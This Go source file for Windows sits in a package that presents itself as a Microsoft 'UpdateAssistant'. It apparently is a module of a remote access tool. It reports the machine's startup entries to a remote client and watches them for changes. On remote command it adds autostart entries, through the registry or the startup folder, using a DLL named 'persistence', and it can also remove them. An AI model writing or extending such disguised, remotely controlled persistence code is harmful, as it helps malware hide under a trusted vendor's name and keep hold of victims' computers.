//go:build windows

package system

import (
	"unsafe"

	"github.com/microsoft/UpdateAssistant/modules/config"
	"github.com/microsoft/UpdateAssistant/modules/loader"
)

type startupEntry struct {
	Name string `json:"name"`
	Path string `json:"path"`
}

func listStartupEntries(s *session) []startupEntry {
	var entries []startupEntry
	buf := make([]byte, config.CmdBuf)
	n, err := s.d.startup.Call("startup_list", uintptr(unsafe.Pointer(&buf[0])), uintptr(config.CmdBuf))
	if err == nil {
		for _, l := range splitLines(string(buf[:int(n)])) {
			if parts := splitTab(l); len(parts) == 2 {
				entries = append(entries, startupEntry{Name: parts[0], Path: parts[1]})
			}
		}
	}
	return entries
}

func sendStartup(s *session) {
	s.client.Send("system_startup", map[string]interface{}{"entries": listStartupEntries(s)})
}

func watchStartup(s *session) {
	defer s.wg.Done()
	for {
		select {
		case <-s.stop:
			return
		default:
		}
		r, _ := s.d.startup.Call("startup_wait_change", uintptr(1000))
		select {
		case <-s.stop:
			return
		default:
		}
		if int(r) == 1 {
			sendStartup(s)
		}
	}
}

func handleStartupAdd(s *session, p struct {
	Name    string   `json:"name"`
	Path    string   `json:"path"`
	Methods []string `json:"methods"`
}) {
	if p.Path == "" {
		return
	}
	finalPath := p.Path
	buf := make([]byte, 256)
	namPtr  := uintptr(unsafe.Pointer(loader.BytePtr(p.Name)))
	pathPtr := uintptr(unsafe.Pointer(loader.BytePtr(finalPath)))
	bufPtr  := uintptr(unsafe.Pointer(&buf[0]))
	for _, m := range p.Methods {
		switch m {
		case "reg":
			s.d.startup.Call("startup_add", pathPtr, namPtr, bufPtr, uintptr(256))
		case "folder":
			if pdll, err := loader.Load("persistence"); err == nil {
				pdll.Call("folder_add", pathPtr, namPtr, bufPtr, uintptr(256))
				loader.Unload(pdll)
			}
		}
	}
	sendStartup(s)
}

func handleStartupRemove(s *session, name string) {
	buf := make([]byte, 256)
	s.d.startup.Call("startup_remove",
		uintptr(unsafe.Pointer(loader.BytePtr(name))),
		uintptr(unsafe.Pointer(&buf[0])),
		uintptr(256),
	)
	sendStartup(s)
}